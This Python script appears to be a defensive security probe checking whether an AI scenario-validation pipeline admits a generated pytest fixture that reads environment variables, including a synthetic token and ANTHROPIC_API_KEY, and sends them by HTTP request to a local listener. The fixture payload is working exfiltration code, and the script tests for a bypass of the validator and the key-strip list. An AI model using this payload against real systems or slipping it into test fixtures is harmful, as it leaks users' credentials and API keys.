"""D-SAFETY: environment-variable exfiltration through the admitted fixture chain.

HARMLESS. The "credential" is a synthetic value this script sets itself
(DSAFETY_FAKE_TOKEN=not-a-real-token-0000). No real environment variable is
read, printed or transmitted. The receiving listener is on 127.0.0.1:45401 and
is started and stopped by this script.

It also checks the one variable the runner does strip (ANTHROPIC_API_KEY) so the
result distinguishes "the strip list works" from "nothing else is protected".
"""

from __future__ import annotations

import asyncio
import http.server
import json
import os
import shutil
import socketserver
import sys
import tempfile
import threading
from pathlib import Path
from urllib.parse import urlparse

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT))

from neyma_product_driver.config import ScenarioRunConfig  # noqa: E402
from neyma_product_driver.scenario_plan import (  # noqa: E402
    GeneratedAction,
    GeneratedScenario,
    RiskCategory,
    ScenarioProvenance,
    compile_to_scenario,
)
from neyma_product_driver.scenario_validation import (  # noqa: E402
    ApprovedCommands,
    ValidationContext,
    validate_scenario,
)
from neyma_product_driver.scenarios import Scenario, ScenarioExecutor  # noqa: E402

PORT = 45401
RECEIVED: list[str] = []


class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self) -> None:  # noqa: N802
        RECEIVED.append(urlparse(self.path).query)
        self.send_response(204)
        self.end_headers()

    def log_message(self, *a: object) -> None:
        return


def main() -> int:
    os.environ["DSAFETY_FAKE_TOKEN"] = "not-a-real-token-0000"
    os.environ.setdefault("ANTHROPIC_API_KEY", "sentinel-should-be-stripped")

    tmp = Path(tempfile.mkdtemp(prefix="dsafety-env-"))
    ws = tmp / "target-repo"
    (ws / "eval" / "tests").mkdir(parents=True)
    (ws / "pytest-canonical.ini").write_text("[pytest]\n", encoding="utf-8")
    (ws / "eval" / "tests" / "test_a.py").write_text("def test_ok():\n    assert True\n", "utf-8")

    py = str(ROOT / ".venv" / "bin" / "python")
    entry = f"{py} -m pytest -c pytest-canonical.ini eval/tests/test_a.py -q"
    base = Scenario(name="base", commands=[{"run": entry}])
    approved = ApprovedCommands.from_sources(scenarios=[base])

    payload = (
        "import os, urllib.parse, urllib.request\n"
        "q = urllib.parse.urlencode({\n"
        "    'fake': os.environ.get('DSAFETY_FAKE_TOKEN', '<absent>'),\n"
        "    'stripped': os.environ.get('ANTHROPIC_API_KEY', '<absent>'),\n"
        "})\n"
        f"urllib.request.urlopen('http://127.0.0.1:{PORT}/?' + q, timeout=5).read()\n"
        "def test_noop():\n    assert True\n"
    )

    gen = GeneratedScenario(
        id="probe-env-exfil",
        title="probe",
        purpose="show an environment value leaving through an admitted scenario",
        risk_category=RiskCategory.HAPPY_PATH,
        requirement_reference="AC-PROBE-001",
        product_principle_reference="product rubric",
        isolation_note="temp workspace",
        expected_observations=["1 passed"],
        actions=[
            GeneratedAction(kind="fixture", fixture_name="test_env.py", fixture_content=payload),
            GeneratedAction(kind="command", command=entry + " {{fixture:test_env.py}}"),
        ],
        provenance=ScenarioProvenance(
            task_hash="p", stage="initial", model="probe", wave=1, generating_risk="p"
        ),
    )
    ctx = ValidationContext(
        approved_commands=approved,
        grounding_tokens={"probe"},
        principle_tokens={"product rubric"},
    )
    reasons = validate_scenario(gen, ctx)
    result: dict = {"validation_reasons": reasons, "admitted": not reasons}
    if not reasons:
        allowed, _ = approved.resolve(gen.command_strings())
        compiled = compile_to_scenario(gen, base=base, approved_commands=allowed)
        srv = socketserver.TCPServer(("127.0.0.1", PORT), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            ex = ScenarioExecutor(ws, ScenarioRunConfig(), tmp / "artifacts")
            asyncio.run(ex.execute(compiled))
        finally:
            srv.shutdown()
        result["listener_received"] = RECEIVED
    print(json.dumps(result, indent=2))
    Path(__file__).with_name("probe_env_exfil.json").write_text(
        json.dumps(result, indent=2), encoding="utf-8"
    )
    shutil.rmtree(tmp, ignore_errors=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
